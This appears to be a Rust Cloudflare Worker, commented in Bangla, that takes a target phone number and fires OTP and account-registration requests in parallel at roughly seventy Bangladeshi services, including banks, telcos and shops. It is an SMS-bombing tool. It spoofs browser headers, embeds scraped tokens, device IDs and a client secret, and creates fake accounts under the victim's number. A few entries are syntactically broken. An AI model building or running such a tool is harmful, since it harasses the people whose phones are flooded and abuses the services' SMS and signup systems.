use worker::*;
use serde_json::{json, Value};
use wasm_bindgen_futures::JsFuture;
use wasm_bindgen::JsValue;

// ═══════════════════════════════════════════════════
//  CORS — wildcard, সব origin allow
// ═══════════════════════════════════════════════════
pub fn cors_headers() -> Headers {
    let mut h = Headers::new();
    h.set("Access-Control-Allow-Origin", "*").unwrap();
    h.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS").unwrap();
    h.set("Access-Control-Allow-Headers", "Content-Type").unwrap();
    h.set("Content-Type", "application/json").unwrap();
    h
}

// ═══════════════════════════════════════════════════
//  SINGLE API CALL — ultra fast, no blocking
// ═══════════════════════════════════════════════════
async fn fire(
    name:    &'static str,  // API নাম
    url:     &'static str,  // API URL
    payload: Value,         // JSON body
) -> Value {
    let mut init = RequestInit::new();
    init.with_method(Method::Post);

    let mut h = Headers::new();
    h.set("Content-Type",  "application/json").unwrap();
    h.set("User-Agent",    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36").unwrap();
    h.set("Accept",        "application/json, */*").unwrap();
    h.set("Accept-Language", "en-US,en;q=0.9").unwrap();
    init.with_headers(h);
    init.with_body(Some(payload.to_string().into()));

    match Request::new_with_init(url, &init) {
        Ok(req) => match Fetch::Request(req).send().await {
            Ok(mut r) => {
                let s = r.status_code();
                json!({"api": name, "status": s, "ok": s==200||s==201||s==202})
            }
            Err(_) => json!({"api": name, "status": 0, "ok": false})
        },
        Err(_) => json!({"api": name, "status": 0, "ok": false})
    }
}

// ═══════════════════════════════════════════════════
//  PARALLEL RUNNER — সব API একসাথে fire করে
//  Cloudflare Workers WASM এ সবচেয়ে fast পদ্ধতি
// ═══════════════════════════════════════════════════
macro_rules! parallel {
    ($($f:expr),+ $(,)?) => {{
        let js_promises = js_sys::Array::new();
        $(
            js_promises.push(
                &wasm_bindgen_futures::future_to_promise(async move {
                    let v = $f.await;
                    Ok(JsValue::from_str(&v.to_string()))
                })
            );
        )+
        let all = js_sys::Promise::all(&js_promises);
        let results_js = JsFuture::from(all).await.unwrap_or(JsValue::NULL);
        let arr = js_sys::Array::from(&results_js);
        let mut out: Vec<Value> = Vec::new();
        for i in 0..arr.length() {
            let s = arr.get(i).as_string().unwrap_or_default();
            out.push(serde_json::from_str(&s).unwrap_or(json!({"ok":false})));
        }
        out
    }};
}

// ═══════════════════════════════════════════════════
//  MAIN HANDLER
// ═══════════════════════════════════════════════════
pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    let headers = cors_headers();

    if req.method() == Method::Options {
        return Ok(Response::empty()?.with_headers(headers));
    }
    if req.method() != Method::Post {
        return Ok(Response::error("POST Only", 405)?.with_headers(headers));
    }

    let body: Value = req.json().await.unwrap_or_default();
    let number = body.get("number")
        .and_then(|v| v.as_str())
        .unwrap_or("").trim().to_string();

    if number.is_empty() {
        return Ok(Response::ok(
            json!({"status":"error","message":"Number missing"}).to_string()
        )?.with_headers(headers));
    }

    // ── Phone number formats ──
    let bd_no   = number.trim_start_matches('0').to_string(); // 1XXXXXXXXX
    let bd_full = format!("880{}", bd_no);                    // 8801XXXXXXXXX
    let plus_bd = format!("+88{}", number);                   // +8801XXXXXXXXX

    // ═══════════════════════════════════════════════
    //  API LIST — সব একসাথে parallel fire হবে
    //
    //  নতুন API যোগ করতে:
    //  fire(
    //      "API নাম",           ← name
    //      "https://api.url",   ← url
    //      json!({              ← body/data
    //          "key": &number,
    //      })
    //  ),
    // ═══════════════════════════════════════════════
    let api_results = parallel![
        // ── BD SMS APIs ──
        fire("Nexo Pat")
    "https://host03pet.nexopet.com/api/v1.0/users/send-otp"
    json!({"phone": &number,})     
), 
       fire("Shadhin Music",
    "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
    json!({"msisdn": &bd_full, "shortcode": 16235, "servicename": "Shadhin Music"})
),
fire("Khaodao",
    "https://api.eat-z.com/auth/customer/app-connect",
    json!({"username": &plus_bd})
),
fire("Walton Plaza",
    "https://waltonplaza.com.bd/api/auth/otp/create",
    json!({"auth": {"countryCode": "880", "deviceUuid": "ee757830-f639-12f0-9f4d-2f972746fhg", "phone": &bd_no}, "captchaToken": "recapcha"})
),
fire("Apex4u",
    "https://api.apex4u.com/api/auth/login",
    json!({"phoneNumber": &number})
),
        
        
fire("AWS POC",
    "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
    json!({"phone": &number})
),
fire("Otithee",
    "https://gateway.otithee.com/api/v1/generate-otp",
    json!({"request_type": "registration", "mobile_number": &number})
),
fire("Quizgiri",
    "https://developer.quizgiri.xyz/api/v2.0/send-otp",
    json!({"country_code": "+88", "phone": &number})
),
fire("Mojaru",
    "https://new.mojaru.com/api/student/login",
    json!({"mobile_or_email": &number})
),
fire("GP MyGP",
    "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
    json!({"mobileNumber": &number})
),

fire("Upay",
    "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
    json!({"wallet_number": &number, "geo_location": {"lat": 23.8979093, "long": 89.1356346}, "referral": "", "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI", "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": "Robi"})
),
fire("Chorki",
    "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
    json!({"number": &plus_bd})
),
fire("Deepto Play",
    "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
    json!({"number": &plus_bd})
),
fire("RedX",
    "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
    json!({"phoneNumber": &number})
),
fire("Bohubrihi",
    "https://bb-api.bohubrihi.com/public/activity/otp",
    json!({"phone": &number, "intent": "login"})
),

fire("GP Shop",
    "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
    json!({"phone": &number, "language": "en", "email": ""})
),
fire("Shikho",
    "https://api.shikho.com/public/activity/otp",
    json!({"phone": &number, "intent": "ap-discount-request"})
),

fire("iEducation BD",
    "https://www.ieducationbd.com/api/account/check_user",
    json!({"mobile": &number})
),

fire("Bangladeshi Matrimony",
    "https://www.bangladeshimatrimony.com/register/editmobileno.php",
    json!({"mobileNo": &number})
),

fire("easy com bd",
    "https://core.easy.com.bd/api/v1/registration",
    json!({
        "password": "445566",
        "password_confirmation": "445566",
        "name": "Team Dangerous",
        "mobile": &number, // Ekhane variable 'number' thikmoto link kora hoyeche
        "referrer_key": "",
        "email": "dangerousboytushar@gmail.com"
    })
),

fire("My Guradian BD"
 "https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp"
     json!({
  "mobileNumber": &number,
  "type": null
})
),

fire("Gorilla Move", "https://api.gorillamove.com/api/v1/core/account/phone_login", json!({"phone_number": &number, "step": 1})),
fire("Munchies BD", "https://api.munchies.com.bd/parse/functions/generateOtp", json!({"phone": &number})),
fire("NRB Bazaar", "https://www.nrbbazaar.com/Customer/RequestOtpForRegistration", json!({"phoneNumber": &number, "email": "example@gmail.com", "__RequestVerificationToken": "CfDJ8OTdK55f1KtKpMVto1XODz36P2tWXfyeot9aYuxWqkd81qABD_JFUva73ce2L5ftYmqCgwInZKUHisKU3mWb6DkYgBFDg4QIej8YwHP3BQ3fQvgBfc6mbMjVua7p-AT4MEPtgYhLexJmTxl7enCosqA"})),
fire("Medico Bio", "https://api.v2.medico.bio/patient/passwordless-login", json!({"phoneNumber": &number, "deviceId": &number, "channel": "web", "userType": "patient", "type": "newUser"})),
fire("Paymaster BD", "https://ap.paymasterbd.net/login_registration/", json!({"phone_number": &number, "fcm_key": "", "device_id": "b5f0985eb84c4bfa", "sms_hash_code": "s2//QkN6BpW"})),
fire("Relaxy BD", "https://dev.api.relaxy.com.bd/api/v1/otp/send", json!({"phoneNumber": &plus_bd, "appSignature": "appSignature"})),
fire("Porter BD", "https://customerapp-gateway-ktor.prod.porter.ae/onboarding/customer/signup", json!({"phone": &number})),
fire("MyGuardian BD", "http://api.myguardianbd.com/api/requestOtp", json!({"new": "1", "device_id": "ec352e5211d128ea", "mobile": &number})),
fire("Deepto Play", "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", json!({"number": &plus_bd})),
fire("FSIB Freedom", "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", json!({"AccessToken": "", "TrackingNo": "", "mobileNo": &number, "otpSms": "", "product_id": "131", "requestChannel": "MOB", "trackingStatus": 5})),
fire("GP Cinematic", "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/88{bd_no}", json!({"headers": {"Content-Type": "application/json"}})),
fire("Fundesh", "https://fundesh.com.bd/api/auth/generateOTP", json!({"msisdn": &bd_no})),
fire("Ghoori Learning", "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn", json!({"mobile_no": &number})),
fire("ExpressHub", "https://expresshub.com.bd/User/CreateNewUser", json!({"_UID": &number, "_UNAME": "0", "_MAIL": "0", "_PHONE": "0", "_PASS": "0", "_TYPE": "1"})),
fire("Pharmaid RX", "https://shop.pharmaid-rx.com/api/sendSMSRegistration", json!({"mobileNumber": &number})),
fire("Shadhin Music", "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq", json!({"msisdn": &bd_full, "shortcode": 16235, "servicename": "Shadhin Music"})),
fire("Practice Club", "https://www.practiceclub.net/api/register", json!({"contact_no": &number})),
fire("Quality Foods", "https://admin.qualityfoods.com.bd/api/auth/check-phone", json!({"phone": &number, "is_sign_in": 0, "login_type": "phone"})),
fire("PBS BD", "https://pbs.com.bd/login/?handler=UserGetOtp", json!({"UserName": "", "UserPassword": "", "MobileNo": &number})),
fire("Eat-Z Khaodao", "https://api.eat-z.com/auth/customer/app-connect", json!({"username": &plus_bd})),
fire("Dutch Bangla NX", "https://nxpay1.dutchbanglabank.com/user/register", json!({"aspId": "5678", "locale": "EN", "msisdn": &number, "registrationUserId": &number, "tcidList": [50], "telcoId": "GP"})),
fire("One Fish", "https://api.onefish.app/api/auth/user/sendotp", json!({"phone": &number})),
fire("Hishabee", "https://distribution.hishabee.business/api/app/v1/auth/number-check", json!({"mobile_number": &number})),
fire("RedX", "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", json!({"phoneNumber": &number})),
fire("English Moja", "https://api.englishmojabd.com/api/v1/auth/login", json!({"phone": &plus_bd})),
fire("Sundarban Courier", "https://api-gateway.sundarbancourierltd.com/graphql", json!({"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": &number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }"})),
fire("Apex4u", "https://api.apex4u.com/api/auth/login", json!({"phoneNumber": &number})),
fire("Easy BD Reg", "https://core.easy.com.bd/api/v1/registration", json!({"name": "Rahat", "email": "chowa@gmail.com", "mobile": &number, "password": "123456", "password_confirmation": "123456", "device_key": "48b1f7061f48c950090220f62128b2c3"})),
fire("Osud Kini", "https://api.osudkini.com/api/otp/generate-otp", json!({"phoneNo": &number})),
fire("ABC Lit", "https://abclit.com/api/sendOTP", json!({"recipientNo": &number, "code": 1234})),
fire("Pathao Auth", "https://api.pathao.com/v2/auth/register", json!({"country_prefix": "880", "national_number": &bd_no, "country_id": 1})),
fire("Focallure BD", "https://store.focallurebd.com/api/v1/1/ecom/auth/getCode", json!({"mobile": &number})),
fire("QuizGiri", "https://developer.quizgiri.xyz/api/v2.0/send-otp", json!({"phone": &bd_no, "country_code": "+880"})),
fire("Wholesale Plus", "https://admin.wholesaleplus.com.bd/api/send-otp/", json!({"email": &number, "regi": true})),
fire("Motion View", "https://api.motionview.com.bd/api/send-otp-phone-signup", json!({"phone": &number})),
fire("QPay BD", "https://identity01.qpaybd.com.bd/api/v1/verification/phone", json!({"Id": &number})),
fire("Amiprobashi", "https://www.amiprobashi.com/api/v7/en/auth/send-otp", json!({"device_type": "1", "username": &plus_bd, "for": "1", "type": "1", "bd_number": "1"})),
fire("Bepari App", "https://api.bepari.app/bestfreshfarm/api/V1.4/access-control/user/registerOtp", json!({"client_id": 4, "client_secret": "zCzOixaOJ4JywQr1VsowGZhCaEbZ49WLxweNBgPK", "mobile_no": &number})),
fire("Training Gov BD", "https://training.gov.bd/backoffice/api/user/sendOtp", json!({"mobile": &number})),
fire("ILYN Global", "https://api.ilyn.global/auth/signup", json!({"phone": {"code": "BD", "number": &number}, "provider": "sms"})),
fire("Klassy BD", "https://api.klassy.com.bd/api/v2/public/user/register/send/otp", json!({"phone": &number})),
fire("Rangs Motors", "https://api.rangsmotors.com/", json!({"u_num": &number})),
fire("WinBaji", "https://userapi.fairbet91.com/api/RegisterUser/GenerateOTPV2", json!({"Mobile": &number, "SiteCode": "WBJ"})),
fire("Walton Amar Awaz", "https://walton-amar-awaz-prod.com/api/user/signup", json!({"email": "", "fbId": "", "fullName": "User", "gId": "", "phone": &number})),
fire("ACS Future School", "https://auth.acsfutureschool.com/api/v1/otp/send", json!({"phone": &number})),
fire("Meena Bazar", "https://meenabazardev.com/api/mobile/front/send/otp", json!({"CellPhone": &number, "type": "login"})),

        
        // ── এখানে নতুন API যোগ করো ──
        // fire("API নাম", "https://api.url", json!({"phone": &number})),
        // fire("API নাম", "https://api.url", json!({"mobile": &bd_full})),
    ];

    let success = api_results.iter()
        .filter(|r| r["ok"].as_bool().unwrap_or(false))
        .count() as u32;
    let failed = api_results.len() as u32 - success;

    Ok(Response::ok(json!({
        "status":  "executed",
        "target":  number,
        "success": success,
        "failed":  failed,
        "total":   success + failed,
        "results": api_results
    }).to_string())?.with_headers(headers))
}
